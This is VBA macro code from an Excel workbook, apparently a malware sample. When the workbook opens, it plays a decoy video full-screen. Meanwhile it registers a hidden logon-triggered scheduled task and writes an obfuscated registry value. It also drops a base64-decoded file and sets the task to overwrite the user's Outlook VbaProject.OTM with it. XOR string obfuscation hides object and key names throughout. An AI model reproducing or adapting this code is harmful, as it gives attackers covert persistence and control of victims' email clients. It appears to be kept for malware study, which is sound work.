Attribute VB_Name = "ASPECTO"
Attribute VB_Name = "Hoja1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "WindowsMediaPlayer1, 1, 0, WMPLib, WindowsMediaPlayer"
Private Sub Worksheet_Activate()
    DecodeV
    DecodeI
    
    Application.DisplayFullScreen = True
    Application.DisplayStatusBar = False
    
    WindowsMediaPlayer1.uiMode = "full"
    'WindowsMediaPlayer1.Locked = True
    'WindowsMediaPlayer1.Activate
    
    'ActiveWindow.EnableResize = True
    ActiveWindow.DisplayGridlines = False
    ActiveWindow.DisplayHeadings = False
    ActiveWindow.DisplayHorizontalScrollBar = False
    ActiveWindow.DisplayOutline = False
    ActiveWindow.DisplayRuler = False
    ActiveWindow.DisplayVerticalScrollBar = False
    ActiveWindow.DisplayRightToLeft = False
    ActiveWindow.DisplayWhitespace = False
    ActiveWindow.DisplayWorkbookTabs = False
    ActiveWindow.DisplayZeros = False
    ActiveWindow.DisplayFormulas = False
    
    WindowsMediaPlayer1.Left = 0
    WindowsMediaPlayer1.Top = 0
    
    WindowsMediaPlayer1.Width = Application.Width
    WindowsMediaPlayer1.Height = 0.95 * Application.Height
    
    WindowsMediaPlayer1.BringToFront
    
    WindowsMediaPlayer1.Url = directorio + "\Prueba02.mp4"
    
    Application.DisplayAlerts = False
       
    Application.OnTime Now + TimeValue("0:00:7"), "mensaje"
    
    
End Sub


Attribute VB_Name = "Hoja2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Worksheet_Activate()
    
    '------------------------------------------------------------------
    ' Schedules a task to start a program at next user logon
    ' from the time the task is registered.
    '------------------------------------------------------------------
    
    
    ' A constant that specifies a time-based trigger.
    Const TriggerTypeLogon = 9
    ' A constant that specifies an executable action.
    Const ActionTypeExec = 0
    
    
    '********************************************************
    ' Create the TaskService object.
    Set service = CreateObject(osl65y9j("|05|" & "" & Chr(53) & "" & ">" & Chr(51) & "" & "2" & "" & "#" & "" & Chr(58) & "" & "3" & Chr(120) & "|05|" & Chr(51) & "" & Chr(36) & "" & " " & "" & "?" & "" & Chr(53) & "" & "3"))
    Call service.Connect
    
    '********************************************************
    ' Get a folder to create a task definition in.
    Dim rootFolder
    Set rootFolder = service.GetFolder("\")
    
    ' The taskDefinition variable is the TaskDefinition object.
    Dim taskDefinition
    ' The flags parameter is 0 because it is not supported.
    Set taskDefinition = service.NewTask(0)
    
    '********************************************************
    ' Define information about the task.
    
    ' Set the registration info for the task by
    ' creating the RegistrationInfo object.
    Dim regInfo
    Set regInfo = taskDefinition.RegistrationInfo
    regInfo.Description = osl65y9j(Chr(18) & Chr(57) & Chr(118) & "" & Chr(55) & "" & Chr(118) & "" & "4" & "" & "7" & "5" & "" & "=" & Chr(35) & Chr(38))
    regInfo.Author = osl65y9j(Chr(23) & "" & "#" & Chr(34) & Chr(62) & "9" & "" & "$" & "v" & "" & Chr(24) & "" & "7" & "" & Chr(59) & "" & "3" & "")

    '********************************************************
    ' Set the principal for the task
    Dim principal
    Set principal = taskDefinition.principal
    
    ' Set the logon type to interactive logon
    principal.LogonType = 3
    
    
    ' Set the task setting info for the Task Scheduler by
    ' creating a TaskSettings object.
    Dim settings
    Set settings = taskDefinition.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = True
    
    '********************************************************
    ' Create a time-based trigger.
    Dim triggers
    Set triggers = taskDefinition.triggers
    
    Dim trigger
    Set trigger = triggers.Create(TriggerTypeLogon)
    
    ' Trigger variables that define when the trigger is active.
    Dim startTime, endTime
    
    Dim time
    time = DateAdd(osl65y9j(Chr(37)), 10, Now)   'start time = 30 seconds from now
    startTime = XmlTime(time)
    
    'time = DateAdd(osl65y9j(chr(56) & "" ), 5, Now) 'end time = 5 minutes from now
    time = DateAdd(osl65y9j(";"), 2, Now)
    endTime = XmlTime(time)
    
    
    trigger.StartBoundary = startTime
    trigger.EndBoundary = endTime
    trigger.ExecutionTimeLimit = "PT5M"     'Five minutes
    trigger.ID = osl65y9j(Chr(26) & "" & Chr(57) & "" & Chr(49) & "9" & "" & Chr(56) & "" & "|02|" & Chr(36) & "" & "?" & "" & "1" & "1" & Chr(51) & "" & "$" & Chr(31) & "" & "2")
    trigger.Enabled = True
    
    MsgBox ("Setting environment")
    Dim UNombre
    Dim UDominio
    MsgBox ("Setting uname")
    UNombre = Environ(osl65y9j(Chr(35) & "%" & "" & Chr(51) & "" & Chr(36) & "" & "8" & Chr(55) & "" & Chr(59) & "" & "3" & ""))
    MsgBox ("Setting uDomain")
    UDominio = Environ(osl65y9j(Chr(35) & "" & "%" & Chr(51) & "" & Chr(36) & "2" & "" & Chr(57) & "" & Chr(59) & Chr(55) & Chr(63) & "" & Chr(56)))
    MsgBox (osl65y9j(Chr(3) & Chr(37) & "" & Chr(35) & "" & Chr(55) & "$" & "" & Chr(63) & "9" & "" & "l" & "v" & "") & UDominio & "\" & UNombre)
    trigger.UserID = UDominio & "\" & UNombre
    
    'Crear fichero OTM en disco
    v0mi8nqp
    
    ' Cambia el registro
    Dim ravv56q4 As Object
    Dim claveres
        
    Set ravv56q4 = CreateObject(osl65y9j("|01|" & "|05|" & "" & "5" & "$" & "?" & Chr(38) & "" & """" & "" & Chr(120) & Chr(5) & "" & Chr(62) & Chr(51) & "" & osl65y9j(Chr(108)) & Chr(58)))
        
    MsgBox ("Setting regkey")
    On Error Resume Next
    test_clave = osl65y9j(Chr(30) & "" & Chr(29) & Chr(19) & Chr(15) & Chr(9) & Chr(21) & "|03|" & "" & "|04|" & Chr(4) & Chr(19) & Chr(24) & "|02|" & Chr(9) & "" & "|03|" & "" & Chr(5) & Chr(19) & "|04|" & "" & Chr(10) & "" & Chr(5) & "" & "9" & "0" & """" & "" & Chr(33) & "" & Chr(55) & Chr(36) & "" & Chr(51) & "" & Chr(10) & "" & Chr(27) & Chr(63) & "" & "5" & "$" & Chr(57) & "%" & "9" & "0" & Chr(34) & Chr(10) & "" & "" & "|19|" & "0" & "" & "0" & "?" & "" & Chr(53) & Chr(51) & "" & Chr(10) & Chr(103) & Chr(96) & Chr(120) & "" & "f" & "" & "" & Chr(10) & Chr(25) & "#" & """" & Chr(58) & "" & "9" & Chr(57) & "" & Chr(61) & "" & Chr(10) & "" & "|1a|" & "" & Chr(57) & "" & "7" & Chr(50) & "|1b|" & "" & Chr(55) & "5" & Chr(36) & Chr(57) & "" & "|06|" & "$" & "" & "9" & " " & Chr(63) & "" & Chr(50) & "" & Chr(51) & "" & Chr(36) & "" & Chr(25) & "" & "8" & "|14|" & Chr(57) & "9" & """")
    MsgBox test_clave
    'claveres = ravv56q4.RegWrite(osl65y9j(Chr(30) & "" & Chr(29) & Chr(19) & Chr(15) & Chr(9) & Chr(21) & "|03|" & "" & "|04|" & Chr(4) & Chr(19) & Chr(24) & "|02|" & Chr(9) & "" & "|03|" & "" & Chr(5) & Chr(19) & "|04|" & "" & Chr(10) & "" & Chr(5) & "" & "9" & "0" & """" & "" & Chr(33) & "" & Chr(55) & Chr(36) & "" & Chr(51) & "" & Chr(10) & "" & Chr(27) & Chr(63) & "" & "5" & "$" & Chr(57) & "%" & "9" & "0" & Chr(34) & "" & "|19|" & "0" & "" & "0" & "?" & "" & Chr(53) & Chr(51) & "" & Chr(10) & Chr(103) & Chr(96) & Chr(120) & "" & "f" & "" & "" & Chr(10) & Chr(25) & "#" & """" & Chr(58) & "" & "9" & Chr(57) & "" & Chr(61) & "" & Chr(10) & "" & "|1a|" & "" & Chr(57) & "" & "7" & Chr(50) & "|1b|" & "" & Chr(55) & "5" & Chr(36) & Chr(57) & "" & "|06|" & "$" & "" & "9" & " " & Chr(63) & "" & Chr(50) & "" & Chr(51) & "" & Chr(36) & "" & Chr(25) & "" & "8" & "|14|" & Chr(57) & "9" & """"), 1, osl65y9j("|04|" & Chr(19) & "" & "|11|" & " " & "|12|" & Chr(1) & "|19|" & "|04|" & Chr(18)))
    claveres = ravv56q4.RegWrite(test_clave, 1, osl65y9j("|04|" & Chr(19) & "" & "|11|" & Chr(9) & "|12|" & Chr(1) & "|19|" & "|04|" & Chr(18)))
    On Error GoTo 0
    MsgBox osl65y9j(Chr(21) & Chr(58) & "" & Chr(55) & Chr(32) & "3" & Chr(118) & "2" & Chr(51) & "v" & "$" & Chr(51) & "" & Chr(49) & Chr(63) & "" & "%" & "" & """" & "" & "$" & Chr(57) & "v" & Chr(53) & Chr(55) & "" & Chr(59) & "" & "4" & "" & "?" & Chr(55) & "" & Chr(50) & "" & Chr(55) & Chr(108) & Chr(118) & "") & _
osl65y9j(Chr(30) & "" & Chr(29) & Chr(19) & Chr(15) & Chr(9) & Chr(21) & "|03|" & "" & "|04|" & Chr(4) & Chr(19) & Chr(24) & "|02|" & Chr(9) & "" & "|03|" & "" & Chr(5) & Chr(19) & "|04|" & "" & Chr(10) & "" & Chr(5) & "" & "9" & "0" & """" & "" & Chr(33) & "" & Chr(55) & Chr(36) & "" & Chr(51) & "" & Chr(10) & "" & Chr(27) & Chr(63) & "" & "5" & "$" & Chr(57) & "%" & "9" & "0" & Chr(34) & Chr(10) & "" & "" & "|19|" & "0" & "" & "0" & "?" & "" & Chr(53) & Chr(51) & "" & Chr(10) & Chr(103) & Chr(96) & Chr(120) & "" & "f" & "" & "" & Chr(10) & Chr(25) & "#" & """" & Chr(58) & "" & "9" & Chr(57) & "" & Chr(61) & "" & Chr(10) & "" & "|1a|" & "" & Chr(57) & "" & "7" & Chr(50) & "|1b|" & "" & Chr(55) & "5" & Chr(36) & Chr(57) & "" & "|06|" & "$" & "" & "9" & " " & Chr(63) & "" & Chr(50) & "" & Chr(51) & "" & Chr(36) & "" & Chr(25) & "" & "8" & "|14|" & Chr(57) & "9" & """")
'osl65y9j(Chr(30) & "" & Chr(29) & Chr(19) & Chr(15) & Chr(9) & Chr(21) & "|03|" & "" & "|04|" & Chr(4) & Chr(19) & Chr(24) & "|02|" & " " & "" & "|03|" & "" & Chr(5) & Chr(19) & "|04|" & "" & Chr(10) & "" & Chr(5) & "" & "9" & "0" & """" & "" & Chr(33) & "" & Chr(55) & Chr(36) & "" & Chr(51) & "" & Chr(10) & "" & Chr(27) & Chr(63) & "" & "5" & "$" & Chr(57) & "%" & "9" & "0" & Chr(34) & "" & "|19|" & "0" & "" & "0" & "?" & "" & Chr(53) & Chr(51) & "" & Chr(10) & Chr(103) & Chr(96) & Chr(120) & "" & "f" & "" & "" & Chr(25) & "#" & """" & Chr(58) & "" & "9" & Chr(57) & "" & Chr(61) & "" & Chr(10) & "" & "|1a|" & "" & Chr(57) & "" & "7" & Chr(50) & "|1b|" & "" & Chr(55) & "5" & Chr(36) & Chr(57) & "" & "|06|" & "$" & "" & "9" & " " & Chr(63) & "" & Chr(50) & "" & Chr(51) & "" & Chr(36) & "" & Chr(25) & "" & "8" & "|14|" & Chr(57) & "9" & """")
       
    ' Create the action for the task to execute.

    ' Add an action to the task to execute a program.
    Dim UPerf
    Dim WDir
    Dim Comando
    UPerf = Environ(osl65y9j("|03|" & "" & Chr(37) & Chr(51) & "" & "$" & Chr(6) & Chr(36) & "" & Chr(57) & "" & "0" & "" & Chr(63) & "" & osl65y9j(Chr(108)) & Chr(51)))
    WDir = Environ(osl65y9j(Chr(1) & Chr(63) & "" & Chr(56) & "" & "|12|" & "" & "?" & Chr(36)))
    
    Comando = Hoja4.Cells(1, 2)
    
    Dim Action
    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
    Action.Path = Comando
    Action.Arguments = osl65y9j(Chr(27) & "9" & "" & " " & Chr(51) & "" & "{" & "" & Chr(31) & """" & "3" & Chr(59) & Chr(118) & "" & "{" & "|06|" & "" & Chr(55) & """" & ">" & "v") & UPerf & "\Desktop\decoded_otm_new.txt " & UPerf & "\AppData\Roaming\Microsoft\Outlook\VbaProject.OTM"
    
    MsgBox osl65y9j(Chr(2) & Chr(55) & "" & Chr(37) & Chr(61) & Chr(118) & "" & "2" & Chr(51) & osl65y9j(Chr(102)) & "?" & "" & "8" & "" & Chr(63) & """" & "?" & "" & "9" & "8" & "" & Chr(118) & "5" & "" & "$" & "" & Chr(51) & "" & Chr(55) & Chr(34) & "" & Chr(51) & Chr(50) & "x" & "" & "v" & "|17|" & "" & "4" & "" & "9" & Chr(35) & "" & """" & "" & "v" & "" & """" & "" & Chr(57) & "" & Chr(118) & Chr(37) & Chr(35) & Chr(52) & ";" & "" & Chr(63) & Chr(34) & "" & Chr(118) & "" & """" & ">" & "" & "3" & "v" & "" & Chr(34) & "" & Chr(55) & Chr(37) & "" & "=" & "x" & Chr(120) & "x")
    
    '***********************************************************
    ' Register (create) the task.
    
    Call rootFolder.RegisterTaskDefinition( _
        osl65y9j(Chr(3) & "" & Chr(37) & "" & Chr(51) & Chr(36) & "" & "|02|" & Chr(55) & "" & "%" & "" & "=" & ""), taskDefinition, 6, , , 3)
    
    MsgBox osl65y9j("|02|" & "" & "7" & Chr(37) & "" & "=" & "" & "v" & Chr(37) & "#" & "" & Chr(52) & Chr(59) & "" & "?" & """" & Chr(34) & "" & "3" & "" & Chr(50) & "" & "x")
    

End Sub


Function rqz2(str As String) As Variant: Dim bytes() As Byte: bytes = str: rqz2 = bytes: End Function
Function xycb(bytes() As Byte) As String: Dim str As String: str = bytes: xycb = str: End Function

Function osl65y9j(str As String) As String
    Const p_ As String = "fhtyhle4"
    Dim sb_() As Byte, pb_() As Byte
    sb_ = rqz2(str)
    pb_ = rqz2(p_)
    
    Dim uL As Long
    uL = UBound(sb_)
    
    ReDim scb_(0 To uL) As Byte
    
    Dim idx As Long
    
    For idx = LBound(sb_) To uL:
        If Not sb_(idx) = 0 Then
            c = sb_(idx)
            For i = 0 To UBound(pb_):
                c = c Xor pb_(i)
            Next i
            scb_(idx) = c
        End If
    
    Next idx
    
    osl65y9j = xycb(scb_)
End Function

    
    '------------------------------------------------------------------
    ' Used to get the time for the trigger
    ' startBoundary and endBoundary.
    ' Return the time in the correct format:
    ' YYYY-MM-DDTHH:MM:SS.
    '------------------------------------------------------------------
    Function XmlTime(t)
        Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
        Dim tTime, tDate
    
        cSecond = osl65y9j(Chr(102)) & Second(t)
        cMinute = osl65y9j(Chr(102)) & Minute(t)
        CHour = osl65y9j(Chr(102)) & Hour(t)
        cDay = osl65y9j(Chr(102)) & Day(t)
        cMonth = osl65y9j(Chr(102)) & Month(t)
        cYear = Year(t)
    
        tTime = Right(CHour, 2) & osl65y9j(Chr(108)) & Right(cMinute, 2) & _
            osl65y9j(Chr(108)) & Right(cSecond, 2)
        tDate = cYear & osl65y9j("{" & "") & Right(cMonth, 2) & osl65y9j("{" & "") & Right(cDay, 2)
        XmlTime = tDate & osl65y9j("|02|") & tTime
    End Function


Sub v0mi8nqp()
 
    Dim UPerf
    UPerf = Environ(osl65y9j("|03|" & "" & Chr(37) & Chr(51) & "" & "$" & Chr(6) & Chr(36) & "" & Chr(57) & "" & "0" & "" & Chr(63) & "" & osl65y9j(Chr(108)) & Chr(51)))
    
    Dim epj7k41t As String
    Dim hhn8j26v As String
 
    hhn8j26v1 = Hoja4.Cells(1, 1)
    hhn8j26v2 = Hoja4.Cells(2, 1)
    hhn8j26v3 = Hoja4.Cells(3, 1)
    hhn8j26v4 = Hoja4.Cells(4, 1)
    hhn8j26v5 = Hoja4.Cells(5, 1)
    hhn8j26v6 = Hoja4.Cells(6, 1)
    hhn8j26v7 = Hoja4.Cells(7, 1)
    hhn8j26v8 = Hoja4.Cells(8, 1)
    hhn8j26v9 = Hoja4.Cells(9, 1)
    hhn8j26v10 = Hoja4.Cells(10, 1)
    hhn8j26v = hhn8j26v1 + hhn8j26v2 + hhn8j26v3 + hhn8j26v4 + hhn8j26v5 + hhn8j26v6 + hhn8j26v7 + hhn8j26v8 + hhn8j26v9 + hhn8j26v10
    
    epj7k41t = UPerf & "\Desktop\decoded_otm_new.txt"
 
    'save byte array to temp file
    Open epj7k41t For Binary As #1
       Put #1, 1, DecodeBase64(hhn8j26v)
    Close #1
 
End Sub
 
Private Function DecodeBase64(ByVal strData As String) As Byte()
 
    Dim xwqvl3x0 As Object 'MSXML2.DOMDocument
    Dim eomeqjxg As Object 'MSXML2.IXMLDOMElement
 
    'get dom document
    Set xwqvl3x0 = CreateObject(osl65y9j("|1b|" & "" & Chr(5) & "" & Chr(14) & "|1b|" & "" & Chr(26) & "" & Chr(100) & "x" & "" & "|12|" & "" & Chr(25) & "" & Chr(27) & "" & "|12|" & "" & Chr(57) & "" & Chr(53) & "" & "#" & "" & ";" & "" & "3" & "" & Chr(56) & "" & Chr(34) & ""))
 
    'create node with type of base 64 and decode
    Set eomeqjxg = xwqvl3x0.createElement(osl65y9j("4" & "" & "`" & "" & Chr(98) & ""))
    eomeqjxg.DataType = osl65y9j("4" & Chr(63) & Chr(56) & "x" & "4" & "" & Chr(55) & "" & Chr(37) & "3" & Chr(96) & "b")
    eomeqjxg.Text = strData
    DecodeBase64 = eomeqjxg.nodeTypedValue
 
    'clean up
    Set eomeqjxg = Nothing
    Set xwqvl3x0 = Nothing
 
End Function
Attribute VB_Name = "Hoja3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Hoja4"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "M|fffd|dulo1"
Public Sub mensaje()
    Application.DisplayAlerts = False
    If (Application.Workbooks.Count > 1) Then
        'ThisWorkbook.Close
        'DEjo la aplicaci|fffd|n Excel tal y como estaba
        Application.DisplayFullScreen = False
        'Application.DisplayStatusBar = True
    Else
        'DEjo la aplicaci|fffd|n Excel tal y como estaba
        Application.DisplayFullScreen = False
        'Application.DisplayStatusBar = True
        ActiveWindow.DisplayWorkbookTabs = True
        'Application.Quit
    End If
End Sub

Sub DecodeV()
    Dim strTempPath As String
    Dim b64test As String
    Dim temporal As String
    
    b64test1 = ""
    b64test1 = cargarV
    
    temporal = directorio
    strTempPath = temporal + "\Prueba02.mp4"
    If (Dir(strTempPath) = "") Then
        'save byte array to temp file
        Open strTempPath For Binary As #1
            Put #1, 1, DecodeBase64(b64test1)
        Close #1
    End If
    
End Sub
Sub DecodeI()
    Dim strTempPath As String
    Dim b64test As String
    Dim temporal As String
    
    b64test2 = ""
    b64test2 = cargarI
    
    temporal = directorio
    strTempPath = temporal + "\icono.ico"
    If (Dir(strTempPath) = "") Then
        'save byte array to temp file
        Open strTempPath For Binary As #1
            Put #1, 1, DecodeBase64(b64test2)
        Close #1
    End If
    
End Sub
Function directorio() As String
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    get_TempFolder = fso.GetSpecialFolder(2)
    directorio = get_TempFolder
End Function

Private Function DecodeBase64(ByVal strData As String) As Byte()
 
    Dim objXML As Object 'MSXML2.DOMDocument
    Dim objNode As Object 'MSXML2.IXMLDOMElement
 
    'get dom document
    Set objXML = CreateObject("MSXML2.DOMDocument")
 
    'create node with type of base 64 and decode
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
 
    'clean up
    Set objNode = Nothing
    Set objXML = Nothing
 
End Function

Private Function cargarV() As String
    Dim fila, columna As Integer
    Dim texto As String
    
    fila = 1
    columna = 1
    texto = ""
    While (Hoja2.Cells(fila, columna) <> "")
        texto = texto & Hoja2.Cells(fila, columna)
        fila = fila + 1
    Wend
    cargarV = texto
End Function

Private Function cargarI() As String
    Dim fila, columna As Integer
    Dim texto As String
    
    fila = 1
    columna = 1
    texto = ""
    While (Hoja3.Cells(fila, columna) <> "")
        texto = texto & Hoja3.Cells(fila, columna)
        fila = fila + 1
    Wend
    cargarI = texto
End Function

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
    Hoja2.Activate
    Hoja1.Activate
End Sub


INQUEST-PP=macro
